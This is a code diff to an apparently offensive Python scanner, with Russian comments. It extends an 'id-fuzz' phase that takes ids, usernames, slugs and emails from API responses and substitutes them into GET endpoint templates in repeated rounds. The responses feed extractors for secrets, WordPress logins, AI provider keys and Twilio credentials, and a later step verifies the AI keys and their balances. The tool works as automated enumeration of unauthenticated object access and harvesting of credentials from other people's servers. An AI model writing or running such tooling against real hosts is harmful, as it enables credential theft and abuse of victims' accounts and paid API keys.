@@ -7,6 +7,7 @@ import re
 import ssl
 import time
 from typing import Any
+from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor
 
 import aiohttp
@@ -437,8 +438,27 @@ UUID_VALUE_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0
 # Подстановки окружения: "${REDIS_PASSWORD}", "$DB_PASS", "{{secret_key}}" —
 # в ответе лежит шаблон, а не значение
 INTERPOLATED_RE = re.compile(r'^(?:\$\{[^}]{1,128}\}|\$[A-Za-z_][A-Za-z0-9_]{0,127}|\{\{[^}]{1,128}\}\})$')
+# id-fuzz: пары "поле": значение из тел. Собираются значения полей,
+# чьи имена похожи на подстановочные параметры (id/slug/username/email/...)
+FUZZ_PAIR_RE = re.compile(r'"([A-Za-z_][A-Za-z0-9_]{0,64})"\s*:\s*"?([^",\[\]{}]{1,120})"?', re.I)
+FUZZ_FIELD_RE = re.compile(r'(?:^|_)(?:ids?|uuids?|guid|slug|username|user_login|login|email|code|sku|number)$', re.I)
+
+
+def _fuzz_candidates(param: str, buckets: dict, cap: int) -> list[str]:
+    """Значения бакетов, чьи имена полей бьют в параметр шаблона
+    (exact, суффикс после _, или сам параметр длиннее: user_id -> user)."""
+    p = param.lower()
+    out: list[str] = []
+    for fld in sorted(buckets):
+        if not (fld == p or fld.endswith("_" + p) or p.endswith("_" + fld)):
+            continue
+        for v in sorted(buckets[fld])[: cap]:
+            if v not in out:
+                out.append(v)
+        if len(out) >= cap:
+            break
+    return out[: cap]
 # id'шники в JSON-телах (для id-fuzz: подставляются в GET-шаблоны с {param})
-ID_VALUE_RE = re.compile(r'"(?:id|ID|item_id|object_id|site_id|post_id|user_id)"\s*:\s*"?(\d{1,10})"?')
 
 
 def is_junk_token_value(val: str) -> bool:
@@ -752,7 +772,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             wp_pairs_found: list[dict[str, str]] = []
             wp_panel_seen: bool = False
             # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
-            ids_found: set[int] = set()
+            fuzz_buckets: dict[str, set[str]] = {}
             param_templates_seen: set[str] = set()
 
             # 4. Тестируем эндпоинты
@@ -879,13 +899,18 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     wp_pairs_found.extend(
                                         extract_wp_creds(body[:100_000], fallback_url=base_url))
                                 if cfg.id_fuzz:
-                                    # id'шники из тел — фид для фазы 2 (GET-шаблоны с {param})
+                                    # фаза 1: GET-шаблоны с {param} + значения
+                                    # подстановок из тел (id/username/slug/email/...)
                                     if "{" in path_template and method.upper() == "GET":
                                         param_templates_seen.add(path_template)
-                                    for m in ID_VALUE_RE.finditer(body[:100_000]):
-                                        pid = int(m.group(1))
-                                        if 0 < pid <= 999_999_999:
-                                            ids_found.add(pid)
+                                    for m in FUZZ_PAIR_RE.finditer(body[:100_000]):
+                                        fld = m.group(1).lower()
+                                        val = (m.group(2) or "").strip()
+                                        if not val or not FUZZ_FIELD_RE.search(fld):
+                                            continue
+                                        bucket = fuzz_buckets.setdefault(fld, set())
+                                        if len(bucket) < cfg.id_fuzz_max:
+                                            bucket.add(val)
                                 if cfg.twilio_checks:
                                     twilio_pairs_found.update(extract_twilio_pairs(body[:100_000]))
                                 if cfg.twitter_checks:
@@ -965,98 +990,105 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                     endpoints_data.append(ep_data)
                     result.total_endpoints += 1
 
-            # Фаза 2 — id-fuzz: id'шники из тел подставляем в GET-шаблоны
-            # с {param}. Ответы идут через те же детекторы/экстракторы —
-            # находки фидятся в секреты/wp-пары/AI-ключи и верифицируются
-            # ниже. Каскад: id'шники из фазовых ответов тоже собираются
-            # (у одного сайта бывают поля, которых нет у другого: где-то
-            # приватник, где-то wp-креды). Дедуп (шаблон, id) — запрос
-            # выполняется один раз; дефолтная подстановка '1' из фазы 1
-            # помечена как уже проверенная. Лимиты: id_fuzz_max id на
-            # шаблон, id_fuzz_templates_max шаблонов, id_fuzz_rounds
-            # раундов каскада (новые id -> следующий раунд).
-            if cfg.id_fuzz and ids_found and param_templates_seen:
-                fuzz_seen: set[tuple[str, int]] = {
-                    (t, 1) for t in param_templates_seen  # '1' из фазы 1
-                }
+            # Фаза 2 — id-fuzz: подставляемые значения (id, username, slug,
+            # email, ...) из тел подставляются в GET-шаблоны с {param} по
+            # совпадению имени поля с именем параметра. Ответы идут через
+            # те же детекторы/экстракторы — находки фидятся в секреты/
+            # wp-пары/AI-ключи и верифицируются ниже. Каскад: значения из
+            # фазовых ответов тоже собираются (id 15 может открыть то,
+            # чего нет на id 1). Дедуп (шаблон, param, value) — запрос
+            # выполняется один раз; '1' из фазы 1 помечена как уже
+            # проверенная. Лимиты: id_fuzz_max значений на параметр,
+            # id_fuzz_templates_max шаблонов, id_fuzz_rounds раундов.
+            if cfg.id_fuzz and fuzz_buckets and param_templates_seen:
+                fuzz_seen: set[tuple] = set()
                 for _round in range(cfg.id_fuzz_rounds):
-                    before_round = len(ids_found)
-                    fuzz_changed = False
+                    fuzz_new = False
                     for tmpl in list(param_templates_seen)[: cfg.id_fuzz_templates_max]:
                         if time.monotonic() >= deadline:
                             break
-                        for pid in sorted(ids_found)[: cfg.id_fuzz_max]:
+                        for param in re.findall(r'\{([^}]+)\}', tmpl):
                             if time.monotonic() >= deadline:
                                 break
-                            if (tmpl, pid) in fuzz_seen:
-                                continue
-                            fuzz_seen.add((tmpl, pid))
-                            fuzz_path = re.sub(r'\{[^}]+\}', str(pid), tmpl)
-                            try:
-                                async with session.get(
-                                    base_url.rstrip("/") + fuzz_path,
-                                    allow_redirects=False,
-                                    timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
-                                    proxy=proxy,
-                                ) as fresp:
-                                    if fresp.status != 200:
-                                        continue
-                                    fbody = await fresp.text()
-                                    fpatterns, fsev = classify_response(fbody[:100_000])
-                                    # id'шники из фазового ответа - в каскад
-                                    for m in ID_VALUE_RE.finditer(fbody[:100_000]):
-                                        pid2 = int(m.group(1))
-                                        if 0 < pid2 <= 999_999_999:
-                                            ids_found.add(pid2)
-                                    if not fpatterns:
-                                        continue
-                                    # admin_flag: как в основном проходе
-                                    if "admin_flag" in fpatterns:
-                                        if ADMIN_PATH_RE.search(tmpl) and \
-                                                "admin_area" not in fpatterns:
-                                            fpatterns.append("admin_area")
-                                        else:
-                                            fpatterns.remove("admin_flag")
-                                            if not fpatterns:
+                            for val in _fuzz_candidates(param, fuzz_buckets, cfg.id_fuzz_max):
+                                if time.monotonic() >= deadline:
+                                    break
+                                if (tmpl, param, val) in fuzz_seen:
+                                    continue
+                                fuzz_seen.add((tmpl, param, val))
+                                fuzz_path = re.sub(r'\{' + re.escape(param) + r'\}',
+                                               quote(val, safe=''), tmpl)
+                                try:
+                                    async with session.get(
+                                        base_url.rstrip("/") + fuzz_path,
+                                        allow_redirects=False,
+                                        timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
+                                        proxy=proxy,
+                                    ) as fresp:
+                                        if fresp.status != 200:
+                                            continue
+                                        fbody = await fresp.text()
+                                        fpatterns, fsev = classify_response(fbody[:100_000])
+                                        # подстановочные значения из фазового ответа - в каскад
+                                        before_vals = sum(len(b) for b in fuzz_buckets.values())
+                                        for m in FUZZ_PAIR_RE.finditer(fbody[:100_000]):
+                                            fld = m.group(1).lower()
+                                            fval = (m.group(2) or "").strip()
+                                            if not fval or not FUZZ_FIELD_RE.search(fld):
                                                 continue
-                                    all_patterns.extend(fpatterns)
-                                    fresp_data: dict[str, Any] = {
-                                        # панель: шаблон + id, давший данные
-                                        "path": tmpl + f"#id={pid}",
-                                        "method": "GET",
-                                        "expects_auth": False,
-                                        "status_code": fresp.status,
-                                        "verdict": "VULNERABLE",
-                                        "patterns": fpatterns,
-                                        "response": None,
-                                    }
-                                    try:
-                                        fresp_data["response"] = json.loads(fbody)
-                                    except (json.JSONDecodeError, ValueError):
-                                        fresp_data["response"] = fbody[:100_000]
-                                    endpoints_data.append(fresp_data)
-                                    result.total_endpoints += 1
-                                    result.vulnerable_count += 1
-                                    if severity_order.get(fsev, 0) > severity_order.get(max_severity, 0):
-                                        max_severity = fsev
-                                    # фиды для verify-блоков ниже
-                                    if cfg.secret_checks:
-                                        secrets_found.update(extract_secrets(fbody[:100_000]))
-                                    if cfg.wp_checks:
-                                        if '"wp_user"' in fbody or '"wp_password"' in fbody:
-                                            wp_panel_seen = True
-                                        wp_pairs_found.extend(
-                                            extract_wp_creds(fbody[:100_000], fallback_url=base_url))
-                                    if cfg.ai_key_checks:
-                                        for prov, k in extract_ai_keys(fbody[:100_000]):
-                                            ai_keys_found.setdefault(k, prov)
-                                    if cfg.twilio_checks:
-                                        twilio_pairs_found.update(
-                                            extract_twilio_pairs(fbody[:100_000]))
-                            except (aiohttp.ClientError, asyncio.TimeoutError):
-                                continue
-                    if len(ids_found) == before_round:
-                        # новых id больше нет - каскад сошёлся
+                                            bucket = fuzz_buckets.setdefault(fld, set())
+                                            if len(bucket) < cfg.id_fuzz_max and fval not in bucket:
+                                                bucket.add(fval)
+                                                fuzz_new = True
+                                        if not fpatterns:
+                                            continue
+                                        # admin_flag: как в основном проходе
+                                        if "admin_flag" in fpatterns:
+                                            if ADMIN_PATH_RE.search(tmpl) and \
+                                                    "admin_area" not in fpatterns:
+                                                fpatterns.append("admin_area")
+                                            else:
+                                                fpatterns.remove("admin_flag")
+                                                if not fpatterns:
+                                                    continue
+                                        all_patterns.extend(fpatterns)
+                                        fresp_data: dict[str, Any] = {
+                                            # панель: шаблон + значение подстановки
+                                            "path": tmpl + f"#id={val}",
+                                            "method": "GET",
+                                            "expects_auth": False,
+                                            "status_code": fresp.status,
+                                            "verdict": "VULNERABLE",
+                                            "patterns": fpatterns,
+                                            "response": None,
+                                        }
+                                        try:
+                                            fresp_data["response"] = json.loads(fbody)
+                                        except (json.JSONDecodeError, ValueError):
+                                            fresp_data["response"] = fbody[:100_000]
+                                        endpoints_data.append(fresp_data)
+                                        result.total_endpoints += 1
+                                        result.vulnerable_count += 1
+                                        if severity_order.get(fsev, 0) > severity_order.get(max_severity, 0):
+                                            max_severity = fsev
+                                        # фиды для verify-блоков ниже
+                                        if cfg.secret_checks:
+                                            secrets_found.update(extract_secrets(fbody[:100_000]))
+                                        if cfg.wp_checks:
+                                            if '"wp_user"' in fbody or '"wp_password"' in fbody:
+                                                wp_panel_seen = True
+                                            wp_pairs_found.extend(
+                                                extract_wp_creds(fbody[:100_000], fallback_url=base_url))
+                                        if cfg.ai_key_checks:
+                                            for prov, k in extract_ai_keys(fbody[:100_000]):
+                                                ai_keys_found.setdefault(k, prov)
+                                        if cfg.twilio_checks:
+                                            twilio_pairs_found.update(
+                                                extract_twilio_pairs(fbody[:100_000]))
+                                except (aiohttp.ClientError, asyncio.TimeoutError):
+                                    continue
+                    if not fuzz_new:
+                        # новых подстановочных значений больше нет - сошлось
                         break
 
             # Проверка AI-ключей: валидность/баланс у провайдеров
